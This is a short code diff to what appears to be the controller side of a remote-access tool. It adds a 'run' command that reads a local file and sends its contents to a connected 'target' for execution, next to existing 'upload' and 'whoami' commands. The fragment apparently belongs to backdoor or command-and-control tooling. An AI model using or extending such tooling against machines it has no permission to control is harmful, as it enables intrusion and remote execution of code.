@@ -201,6 +201,11 @@ def send_target_commands(conn):
             if command_user == "upload":
                 file_content = read_file(command[1])
                 command.append(file_content.decode())
+                
+            if command_user == "run":
+                file_content = read_file(command[1])
+                command.append(file_content.decode())
+            
             
             result_from_client = execute_command(conn=conn, data=command)
             if command_user == "whoami":
